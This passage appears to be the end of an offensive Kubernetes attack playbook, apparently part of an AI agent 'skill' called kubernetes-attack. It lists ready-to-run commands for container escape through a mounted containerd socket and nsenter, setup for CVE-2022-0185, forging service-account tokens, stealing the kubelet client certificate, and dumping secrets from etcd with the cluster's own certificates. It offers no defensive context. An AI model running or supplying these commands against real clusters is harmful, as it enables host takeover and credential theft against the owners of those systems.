# Is containerd.sock mounted?
ctr --address /run/containerd/containerd.sock run --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/ubuntu:latest pwn chroot /host bash

# Is hostPID true?
nsenter --target 1 --mount -- bash

# Do you have CAP_SYS_ADMIN?
unshare --mount --propagation=private /  # CVE-2022-0185 setup
mount --bind / /tmp/host                 # or similar

# Forge an SA token (if you have create on serviceaccounts/token)
kubectl create token -n kube-system default

# Steal kubelet client cert from node
cat /var/lib/kubelet/pki/kubelet-client-current.pem

# etcd dump
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets --prefix --keys-only
```

---

*This playbook is maintained as part of the kali-claw `kubernetes-attack` skill. Updates are tracked via `skills/kubernetes-attack/SKILL.md` metadata version.*
